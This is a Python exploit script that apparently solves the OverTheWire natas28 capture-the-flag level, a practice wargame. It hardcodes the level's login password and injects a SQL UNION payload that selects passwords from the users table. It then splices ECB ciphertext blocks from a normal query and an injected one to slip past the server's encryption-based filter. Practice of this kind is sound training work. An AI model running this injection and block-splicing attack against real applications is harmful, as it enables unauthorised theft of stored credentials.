import requests
import re
import urllib
import base64


# Credentials for natas28
username = "natas28"
password = "1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj"

# Target URL
url = "http://natas28.natas.labs.overthewire.org"


session = requests.Session()

#######################################################################################
# function just trying to make the code look clean

def print_hex_query(my_response):
    print("Hex query data: \n")
    query_value = base64.b64decode(requests.utils.unquote(my_response.url[60:]))
    blocks = (query_value).hex()
    for j in range(len(blocks)//32):
        block = blocks[(32*j):(32*j+32)]
        print(block)
    print("-"*20)

def print_base64_query(my_response):
    print("Base64 query data: \n")
    query_value = requests.utils.unquote(my_response.url[60:])
    print(query_value)
    print("-"*20)

def get_hex_query(my_response):
    query_value = base64.b64decode(requests.utils.unquote(my_response.url[60:]))
    hex_query = (query_value).hex()
    return hex_query

def convert_hex2base64(hex_value):
    hex_string = hex_value
    binary_data = bytes.fromhex(hex_string)
    b64_string = base64.b64encode(binary_data).decode()
    #base64_string = b64_string.replace('/','%2F').replace('=','%3D').replace('+','%2B')
    encoded = urllib.parse.quote(b64_string, safe="")
    return encoded

######################################################################################
# malicious request
malicious_payload = "C"*41 + "\' UNION ALL SELECT password FROM users; #"

response_1 = session.post(
    url,
    data={"query": malicious_payload},
    auth=(username, password)
)

print("==========Malicious==========")
print_hex_query(response_1)
malicious=get_hex_query(response_1)


########################################################################################
# normal request
normal_input = "C"*42

response_2 = session.post(
    url,
    data={"query": normal_input},
    auth=(username, password)
)

print("==========Normal==========")
print_hex_query(response_2)
normal=get_hex_query(response_2)

########################################################################################
# craft our payload with good part and bad part to bypass restriction

good = normal[:32*5]
bad = malicious[32*5:]
crafted = good + bad

base64_query = convert_hex2base64(crafted)
search_url = "http://natas28.natas.labs.overthewire.org/search.php/?query="

crafted_query = search_url + base64_query
#print(crafted_query)

########################################################################################
# send get request to get our flag  

response_3 = session.get(
    crafted_query,
    auth=(username, password)
)

print(response_3.text)
